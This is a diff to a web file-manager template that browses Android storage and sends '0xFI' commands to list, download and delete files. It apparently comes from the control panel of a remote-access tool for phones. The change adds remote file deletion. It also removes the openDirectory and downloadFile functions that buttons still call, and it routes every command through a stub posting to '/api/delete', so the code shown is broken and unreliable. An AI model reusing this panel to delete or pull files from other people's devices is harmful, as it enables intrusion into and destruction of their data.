@@ -3,13 +3,12 @@
         <div class="right menu">
             <button onclick="openDirectory(this, '/storage/emulated/0')" class="ui blue button dlop"> <i
                     class="icon home"></i>Home</button>
-            <!-- Home = /storage/emulated/0 -->
         </div>
     </div>
     <table class="ui celled table">
         <thead>
             <tr>
-                <th style="text-align: center" colspan="2">Files</th>
+                <th style="text-align: center" colspan="3">Files</th>
             </tr>
         </thead>
         <tbody>
@@ -20,6 +19,8 @@
                     <% if(!item.isDir) { %>
                     <button class="ui button dlop" onclick="downloadFile(this, '<%= item.path %>')">&nbsp;&nbsp;&nbsp;<i
                             class="icon download blue"></i></button>
+                    <button class="ui button red" onclick="deleteFile(this, '<%= item.path %>')">&nbsp;&nbsp;&nbsp;<i
+                            class="icon trash"></i></button>
                     <% } else { %>
                     <button class="ui button dlop"
                         onclick="openDirectory(this, '<%= item.path %>')">&nbsp;&nbsp;&nbsp;<i
@@ -32,62 +33,69 @@
     </table>
 
     <script>
+        // وظيفة لحذف ملف
+        function deleteFile(element, path) {
+            const confirmation = confirm("هل أنت متأكد أنك تريد حذف هذا الملف؟");
+            if (!confirmation) return;
 
-        function openDirectory(element, path) {
             $(element).children().css("opacity", "0");
-            $(element).addClass('blue');
+            $(element).addClass('red');
             $(element).addClass('loading');
             $('.dlop').addClass('disabled');
             sendCommand('0xFI', {
-                action: 'ls',
+                action: 'rm',
                 path
             }, (error, message) => {
                 if (error) {
                     setTimeout(() => {
                         showNotification('#f03434', error)
                         $(element).children().css("opacity", "1");
-                        $(element).removeClass('blue');
-                        $('.dlop').removeClass('loading')
-                    }, 300)
-                } else {
-                    if (message === 'Requested') {
-                        showNotification('#2ecc71', 'Requesting Files, Please Wait');
-                        setTimeout(() => {
-                            location.reload();
-                        }, 500)
-                    }
-                }
-            })
-        }
-
-        function downloadFile(element, path) {
-            $(element).children().css("opacity", "0");
-            $(element).addClass('green');
-            $(element).addClass('loading');
-            $('.dlop').addClass('disabled');
-            sendCommand('0xFI', {
-                action: 'dl',
-                path
-            }, (error, message) => {
-                if (error) {
-                    setTimeout(() => {
-                        showNotification('#f03434', error)
-                        $(element).children().css("opacity", "1");
-                        $(element).removeClass('green');
+                        $(element).removeClass('red');
                         $('.dlop').removeClass('disabled')
                     }, 300)
                 } else {
                     if (message === 'Requested') {
                         setTimeout(() => {
+                            $(element).closest('tr').remove(); // إزالة الصف من الجدول
+                            showNotification('#2ecc71', 'تم حذف الملف بنجاح.');
                             $(element).children().css("opacity", "1");
-                            $(element).removeClass('green');
-                            $(element).removeClass('loading');
+                            $(element).removeClass('red');
                             $('.dlop').removeClass('disabled')
-                            showNotification('#2ecc71', 'Downloading File, It will be avaliable in `Downloads` Soon');
+                        }, 300)
+                    } else if (message === 'Deleted') {
+                        setTimeout(() => {
+                            $(element).closest('tr').remove(); // إزالة الصف من الجدول
+                            showNotification('#2ecc71', 'تم حذف الملف بنجاح.');
+                            $(element).children().css("opacity", "1");
+                            $(element).removeClass('red');
+                            $('.dlop').removeClass('disabled')
                         }, 300)
                     }
                 }
             })
+        }
+
+        // وظيفة لإرسال الأوامر إلى الخادم
+        function sendCommand(command, data, callback) {
+            // هنا يجب إضافة المنطق لإرسال الأوامر إلى الخادم والتعامل مع الردود
+            // على سبيل المثال، باستخدام AJAX أو WebSocket
+            $.ajax({
+                url: '/api/delete',
+                type: 'POST',
+                data: JSON.stringify(data),
+                contentType: 'application/json',
+                success: (response) => {
+                    callback(null, response.status);
+                },
+                error: (xhr, status, error) => {
+                    callback(error, null);
+                }
+            });
+        }
+
+        function showNotification(color, message) {
+            console.log(`%c${message}`, `color: ${color}`);
+            // تنفيذ منطق الإشعار الفعلي هنا (مثل استخدام إشعار أو نافذة منبثقة)
         }
     </script>
 </div>
